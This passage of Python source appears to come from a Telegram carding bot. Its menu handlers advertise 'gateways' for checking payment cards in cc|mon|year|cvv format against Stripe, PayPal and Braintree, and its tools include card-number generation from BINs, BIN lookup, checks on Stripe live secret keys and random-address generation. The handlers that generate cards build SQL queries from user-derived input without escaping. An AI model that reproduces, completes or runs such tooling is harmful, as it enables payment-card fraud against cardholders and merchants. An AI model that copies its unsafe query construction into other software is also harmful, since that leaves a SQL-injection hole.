                caption=f"<b>Page Number: 2\nGateway 🔥 Ryuk [ 12$ ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_rr} ]\nFormat: <code>$rr cc|mon|year|cvv</code>\nComment: </b>{comment_rr}\n<b>Update Since: </b>{fecha_rr}<b>\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Paypal [ 0.01$ ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_pp} ]\nFormat: <code>$pp cc|mon|year|cvv</code>\nComment: </b>{comment_pp}\n<b>Update Since: </b>{fecha_pp}<b>\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Luxy [ 5$ ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_chk} ]\nFormat: <code>$chk cc|mon|year|cvv</code>\nComment: </b>{comment_chk}\n<b>Update Since: </b>{fecha_chk}<b>\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Kalaka [ 20$ ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_kill} ]\nFormat: <code>$kill cc|mon|year|cvv</code>\nComment: </b>{comment_kill}\n<b>Update Since: </b>{fecha_kill}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)


    elif query_data == "NextPage3Charged":
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='cys'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_cys = Gateway['Status']
        fecha_cys = Gateway['DateOFF']
        comment_cys = Gateway['Mensaje']

        uno = InlineKeyboardButton('[ ↩️ ] 𝐏𝐫𝐞𝐯𝐢𝐨𝐮𝐬 𝐩𝐚𝐠𝐞', callback_data="NextPage2Charged")
        dos = InlineKeyboardButton('[ 🔙 ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬', callback_data="Gateways")
        try :
            repmarkup = InlineKeyboardMarkup(row_width=2).add(uno,dos)
            await bot.edit_message_caption(
                chat_id=chat_id, 
                message_id=msg_id,
                caption=f"<b>Page Number: 3\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Calypso [ 21$ ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_cys} ]\nFormat: <code>$cys cc|mon|year|cvv</code>\nComment: </b>{comment_cys}\n<b>Update Since: </b>{fecha_cys}<b>\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)

    elif query_data == "3D CHK":
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='vbv'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_vbv = Gateway['Status']
        fecha_vbv = Gateway['DateOFF']
        comment_vbv = Gateway['Mensaje']

        uno = InlineKeyboardButton('𝐀𝐔𝐓𝐇 𝐆.', callback_data="Auth")
        dos = InlineKeyboardButton('𝐂𝐇𝐀𝐑𝐆𝐄𝐃 𝐆.', callback_data="Charged")
        tres = InlineKeyboardButton('[ 🔙 ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬', callback_data="Gateways")
        try :
            repmarkup = InlineKeyboardMarkup(row_width=3).add(uno,dos,tres)
            await bot.edit_message_caption(
                chat_id=chat_id, 
                message_id=msg_id,
                caption=f"<b>- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Braintree [ VBV ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_vbv} ]\nFormat: <code>$vbv cc|mon|year|cvv</code>\nComment: </b>{comment_vbv}\n<b>Update Since: </b>{fecha_vbv}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)

    elif query_data == "CCN":
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='sy'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_sy = Gateway['Status']
        fecha_sy = Gateway['DateOFF']
        comment_sy = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='pez'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_pez = Gateway['Status']
        fecha_pez = Gateway['DateOFF']
        comment_pez = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='od'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_od = Gateway['Status']
        fecha_od = Gateway['DateOFF']
        comment_od = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='ti'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_ti = Gateway['Status']
        fecha_ti = Gateway['DateOFF']
        comment_ti = Gateway['Mensaje']

        uno = InlineKeyboardButton('𝐀𝐔𝐓𝐇 𝐆.', callback_data="Auth")
        dos = InlineKeyboardButton('𝐂𝐇𝐀𝐑𝐆𝐄𝐃 𝐆.', callback_data="Charged")
        tres = InlineKeyboardButton('[ 🔙 ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬', callback_data="Gateways")
        try :
            repmarkup = InlineKeyboardMarkup(row_width=3).add(uno,dos,tres)
            await bot.edit_message_caption(
                chat_id=chat_id, 
                message_id=msg_id,
                caption=f"<b>Page Number: 1\nGateway 🔥 Syberus [ CCN - 5$ ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_sy} ]\nFormat: <code>$sy cc|mon|year|cvv</code>\nComment: </b>{comment_sy}\n<b>Update Since: </b>{fecha_sy}<b>\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Pezcary [ CCN - Auth ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_pez} ]\nFormat: <code>$pez cc|mon|year|cvv</code>\nComment: </b>{comment_pez}\n<b>Update Since: </b>{fecha_pez}<b>\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Olimpo [ CCN - Auth ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_od} ]\nFormat: <code>$od cc|mon|year|cvv</code>\nComment: </b>{comment_od}\n<b>Update Since: </b>{fecha_od}<b>\n- - - - - - - - - - - - - - - - - - - - -</b>\n<b>Gateway 🔥 Tilin [ CCN - 10$ ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_ti} ]\nFormat: <code>$ti cc|mon|year|cvv</code>\nComment: </b>{comment_ti}\n<b>Update Since: </b>{fecha_ti}<b>\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)

    elif query_data == "MASS":
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='masstr'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_masstr = Gateway['Status']
        fecha_masstr = Gateway['DateOFF']
        comment_masstr = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='masscn'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_masscn = Gateway['Status']
        fecha_masscn = Gateway['DateOFF']
        comment_masscn = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='massop'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_massop = Gateway['Status']
        fecha_massop = Gateway['DateOFF']
        comment_massop = Gateway['Mensaje']

        uno = InlineKeyboardButton('𝐀𝐔𝐓𝐇 𝐆.', callback_data="Auth")
        dos = InlineKeyboardButton('𝐂𝐇𝐀𝐑𝐆𝐄𝐃 𝐆.', callback_data="Charged")
        tres = InlineKeyboardButton('[ 🔙 ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬', callback_data="Gateways")
        
        try :
            repmarkup = InlineKeyboardMarkup(row_width=3).add(uno,dos,tres)
            await bot.edit_message_caption(
                chat_id=chat_id, 
                message_id=msg_id,
                caption=f"<b>Page Number: 1\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Mass Stripe [ CCN - 5$ ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_masstr} ]\nFormat: <code>$masstr cc|mon|year|cvv</code>\nComment: </b>{comment_masstr}\n<b>Update Since: </b>{fecha_masstr}<b>\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Mass Unknown [ CCN - 1$ ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_masscn} ]\nFormat: <code>$masscn cc|mon|year|cvv</code>\nComment: </b>{comment_masscn}\n<b>Update Since: </b>{fecha_masscn}<b>\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Mass Unknown [ CCN Auth ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_massop} ]\nFormat: <code>$massop cc|mon|year|cvv</code>\nComment: </b>{comment_massop}\n<b>Update Since: </b>{fecha_massop}<b>\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)

    elif query_data == "Tools":
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='bin'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_bin = Gateway['Status']
        fecha_bin = Gateway['DateOFF']
        comment_bin  = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='gen'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_gen = Gateway['Status']
        fecha_gen = Gateway['DateOFF']
        comment_gen = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='sk'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_sk = Gateway['Status']
        fecha_sk = Gateway['DateOFF']
        comment_sk = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='dd'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_dd = Gateway['Status']
        fecha_dd = Gateway['DateOFF']
        comment_dd = Gateway['Mensaje']

        uno = InlineKeyboardButton('[ 🔙 ] 𝐇𝐨𝐦𝐞', callback_data="Home")
        try :
            repmarkup = InlineKeyboardMarkup(row_width=1).add(uno)
            await bot.edit_message_caption(
                chat_id=chat_id, 
                message_id=msg_id,
                caption=f"<b>- - - - - - - - - - - - - - - - - - - - -\nTool 🔥 SK CHECK\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_sk} ]\nFormat: <code>$sk sk_live_</code>\nComment: </b>{comment_sk}\n<b>Update Since: </b>{fecha_sk}\n<b>- - - - - - - - - - - - - - - - - - - - -\nTool 🔥 CCGEN\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_gen} ]\nFormat: <code>$gen cc|mon|year|cvv</code>\nComment: </b>{comment_gen}\n<b>Update Since: </b>{fecha_gen}\n<b>- - - - - - - - - - - - - - - - - - - - -\nTool 🔥 BIN LOOKUP\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_bin} ]\nFormat: <code>$bin xxxxxx</code>\nComment: </b>{comment_bin}\n<b>Update Since: </b>{fecha_bin}\n<b>- - - - - - - - - - - - - - - - - - - - -\nTool 🔥 RANDOM ADDRESS\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_dd} ]\nFormat: <code>$dd US, CA, UK</code>\nComment: </b>{comment_dd}\n<b>Update Since: </b>{fecha_dd}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)

    elif  query_data == 'GenerateAgain' :
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        if callback_query.message.reply_to_message.reply_to_message: VerMessage = re.sub("\n", " ", callback_query.message.reply_to_message.reply_to_message.text)
        else : VerMessage = re.sub("\n", " ", callback_query.message.reply_to_message.text[5:])

        try :
            VerMessage = re.sub("[^0-9a-zA-Z]", " ", VerMessage)
            matchcc = re.findall(r"\b[0-9a-zA-Z]{6,16}\b", VerMessage)
            for i in matchcc :
                i = matchcc
            l = i
            for x in range(len(l)) :
                list_= l[x]
                if  list_[0:6].isnumeric() :
                    CCnum=list_
        except : CCnum = 'xxxxxx'
        try :
            mes = re.sub("[^0-9]", " ", VerMessage)
            BinCheck = int(CCnum[0:1])
            if 3 <= int(BinCheck) <= 6 :
                if 4 <= int(BinCheck) <= 6 :
                    matchmes = re.findall(r"\b(0[1-9]|1[0-2])\b", mes)
                    mes = matchmes[0]
                elif int(BinCheck) == 3 :
                    matchmes = re.findall(r"\b(0[1-9]|1[0-2])\b", mes)
                    mes = matchmes[0]
        except : mes = 'xx'
        try:
            ano = re.sub("[^0-9]", " ", VerMessage)
            BinCheck = int(CCnum[0:1])
            if 3 <= int(BinCheck) <= 6 :
                if 4 <= int(BinCheck) <= 6 :
                    matchano = re.findall(r"\b(3[0-1]|2[2-9]|202[2-9]|203[0-1])\b", ano)
                    ano = matchano[0]
                    if len(ano) == 2 :
                        ano = f'20{ano}'
                elif int(BinCheck) == 3 :
                    matchano = re.findall(r"\b(3[0-1]|2[2-9]|202[2-9]|203[0-1])\b", ano)
                    ano = matchano[0]
                    if len(ano) == 2 :
                        ano = f'20{ano}'
        except : ano = 'xxxx'
        try:
            cvv = re.sub("[^0-9a-zA-Z]", " ", VerMessage)
            BinCheck = int(CCnum[0:1])
            if 3 <= int(BinCheck) <= 6 :
                if 4 <= int(BinCheck) <= 6 :
                    matchcvv = re.findall(r"\b[0-9a-zA-Z][0-9a-zA-Z][0-9a-zA-Z]\b", cvv.lower())
                    cvv = matchcvv[0]
                    cvv = re.sub("[^0-9x]", "x", cvv)
                    cvv = cvv.ljust(3, 'x')
                    cvv = cvv[0:3]
                elif int(BinCheck) == 3 :
                    matchcvv = re.findall(r"\b[0-9a-zA-Z][0-9a-zA-Z][0-9a-zA-Z][0-9a-zA-Z]\b", cvv.lower())
                    cvv = matchcvv[0]
                    cvv = re.sub("[^0-9x]", "x", cvv)
                    cvv = cvv.ljust(4, 'x')
                    cvv = cvv[0:4]
        except : cvv = 'rnd'
        VerMessage = f'{CCnum}|{mes}|{ano}|{cvv}'

        try :
            result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{VerMessage[0:6]}'")
            result = json.loads(json.dumps(result[0]))
            type = result['type']
            level = result['level']
            brand = result['brand']
            bank = result['bank']
            emoji = result['Emoji']
        except : return "ERROR"

        try:
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{callback_query.message.reply_to_message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
        except IndexError : return "ERROR SEARCHING USER ID"

        if VerMessage:
            from GEN import GeneatedCC

            finalr = str(await GeneatedCC(VerMessage)).split('-')
            listcc = finalr[0]
            extrapcc = finalr[1]

            result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{callback_query.message.reply_to_message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
            UserStatus =  result['Status']

            if callback_query.message.reply_to_message.from_user.username == None :
                UserName = f"<a href='tg://user?id={callback_query.message.reply_to_message.from_user.id}'>{callback_query.message.reply_to_message.from_user.first_name}</a>";
            else :
                UserName = f'@{callback_query.message.reply_to_message.from_user.username}'

            await CheckPRM(callback_query.message.reply_to_message.chat.type, callback_query.message.reply_to_message.from_user.id, callback_query.message.reply_to_message.chat.id)

            fin = '0.100'

            try :
                one = InlineKeyboardButton('𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐀𝐠𝐚𝐢𝐧', callback_data="GenerateAgain")
                dos = InlineKeyboardButton('𝐅𝐨𝐫𝐦𝐚𝐭𝐞 𝐌𝐚𝐬𝐬', callback_data="FormateMass")
                tres = InlineKeyboardButton('𝐂𝐥𝐞𝐚𝐧 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 🗑️', callback_data="Finish")
                repmarkup = InlineKeyboardMarkup(row_width=3).add(one,dos).add(tres)
                await bot.edit_message_text(
                    chat_id=chat_id, 
                    message_id=msg_id,
                    text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nInfo - ↯ <code>{brand} - {type} - {level} | {bank} [{emoji}]</code>\n- - - - - - - - - - - - - - - - - - - - -\nBin - ↯ <code>{VerMessage[0:6]}</code> | Time - ↯ <code>{fin[0:5]}s</code>\nInput - ↯ <code>{extrapcc}|{mes}|{ano}|{cvv}</code>\n- - - - - - - - - - - - - - - - - - - - -\n{listcc}- - - - - - - - - - - - - - - - - - - - -\nChecked by - ↯ {UserName} [{UserStatus}]</b>",
                    reply_markup=repmarkup)
                #return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)

    elif  query_data == 'FormateMass' :
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        if callback_query.message.reply_to_message.reply_to_message: VerMessage = re.sub("\n", " ", callback_query.message.reply_to_message.reply_to_message.text)
        else : VerMessage = re.sub("\n", " ", callback_query.message.reply_to_message.text[5:])

        try :
            VerMessage = re.sub("[^0-9a-zA-Z]", " ", VerMessage)
            matchcc = re.findall(r"\b[0-9a-zA-Z]{6,16}\b", VerMessage)
            for i in matchcc :
                i = matchcc
            l = i
            for x in range(len(l)) :
                list_= l[x]
                if  list_[0:6].isnumeric() :
                    CCnum=list_
        except : CCnum = 'xxxxxx'
        try :
            mes = re.sub("[^0-9]", " ", VerMessage)
            BinCheck = int(CCnum[0:1])
            if 3 <= int(BinCheck) <= 6 :
                if 4 <= int(BinCheck) <= 6 :
                    matchmes = re.findall(r"\b(0[1-9]|1[0-2])\b", mes)
                    mes = matchmes[0]
                elif int(BinCheck) == 3 :
                    matchmes = re.findall(r"\b(0[1-9]|1[0-2])\b", mes)
                    mes = matchmes[0]
        except : mes = 'xx'
        try:
            ano = re.sub("[^0-9]", " ", VerMessage)
            BinCheck = int(CCnum[0:1])
            if 3 <= int(BinCheck) <= 6 :
                if 4 <= int(BinCheck) <= 6 :
                    matchano = re.findall(r"\b(3[0-1]|2[2-9]|202[2-9]|203[0-1])\b", ano)
                    ano = matchano[0]
                    if len(ano) == 2 :
                        ano = f'20{ano}'
                elif int(BinCheck) == 3 :
                    matchano = re.findall(r"\b(3[0-1]|2[2-9]|202[2-9]|203[0-1])\b", ano)
                    ano = matchano[0]
                    if len(ano) == 2 :
                        ano = f'20{ano}'
        except : ano = 'xxxx'
        try:
            cvv = re.sub("[^0-9a-zA-Z]", " ", VerMessage)
            BinCheck = int(CCnum[0:1])
            if 3 <= int(BinCheck) <= 6 :
                if 4 <= int(BinCheck) <= 6 :
                    matchcvv = re.findall(r"\b[0-9a-zA-Z][0-9a-zA-Z][0-9a-zA-Z]\b", cvv.lower())
                    cvv = matchcvv[0]
                    cvv = re.sub("[^0-9x]", "x", cvv)
                    cvv = cvv.ljust(3, 'x')
                    cvv = cvv[0:3]
                elif int(BinCheck) == 3 :
                    matchcvv = re.findall(r"\b[0-9a-zA-Z][0-9a-zA-Z][0-9a-zA-Z][0-9a-zA-Z]\b", cvv.lower())
                    cvv = matchcvv[0]
                    cvv = re.sub("[^0-9x]", "x", cvv)
                    cvv = cvv.ljust(4, 'x')
                    cvv = cvv[0:4]
        except : cvv = 'rnd'
        VerMessage = f'{CCnum}|{mes}|{ano}|{cvv}'

        try :
            result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{VerMessage[0:6]}'")
            result = json.loads(json.dumps(result[0]))
            type = result['type']
            level = result['level']
            brand = result['brand']
            bank = result['bank']
            emoji = result['Emoji']
        except : return "ERROR"

        try:
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{callback_query.message.reply_to_message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
        except IndexError : return "ERROR SEARCHING USER ID"

        if VerMessage:
            from GEN import GeneatedCC

            finalr = str(await GeneatedCC(VerMessage)).split('-')
            listcc = finalr[0]
            extrapcc = finalr[1]

            result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{callback_query.message.reply_to_message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
            UserStatus =  result['Status']

            if callback_query.message.reply_to_message.from_user.username == None :
                UserName = f"<a href='tg://user?id={callback_query.message.reply_to_message.from_user.id}'>{callback_query.message.reply_to_message.from_user.first_name}</a>";
            else :
                UserName = f'@{callback_query.message.reply_to_message.from_user.username}'

            await CheckPRM(callback_query.message.reply_to_message.chat.type, callback_query.message.reply_to_message.from_user.id, callback_query.message.reply_to_message.chat.id)

            fin = '0.100'

            try :
                one = InlineKeyboardButton('𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐀𝐠𝐚𝐢𝐧 [𝐌𝐚𝐬𝐬]', callback_data="FormateMass")
                dos = InlineKeyboardButton('𝐅𝐨𝐫𝐦𝐚𝐭𝐞 𝐍𝐨𝐫𝐦𝐚𝐥', callback_data="GenerateAgain")
                tres = InlineKeyboardButton('𝐂𝐥𝐞𝐚𝐧 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 🗑️', callback_data="Finish")
                repmarkup = InlineKeyboardMarkup(row_width=3).add(one,dos).add(tres)
                await bot.edit_message_text(
                    chat_id=chat_id, 
                    message_id=msg_id,
                    text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nInfo - ↯ <code>{brand} - {type} - {level} | {bank} [{emoji}]</code>\n- - - - - - - - - - - - - - - - - - - - -\nBin - ↯ <code>{VerMessage[0:6]}</code> | Time - ↯ <code>{fin[0:5]}s</code>\nInput - ↯ <code>{extrapcc}|{mes}|{ano}|{cvv}</code>\n- - - - - - - - - - - - - - - - - - - - -\n<code>{listcc}</code>- - - - - - - - - - - - - - - - - - - - -\nChecked by - ↯ {UserName} [{UserStatus}]</b>",
                    reply_markup=repmarkup)
                #return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)

    elif query_data == "Finish":
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        try :
            await bot.delete_message(chat_id=chat_id, message_id=msg_id)
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)

if __name__ == '__main__':
    executor.start_polling(dp)
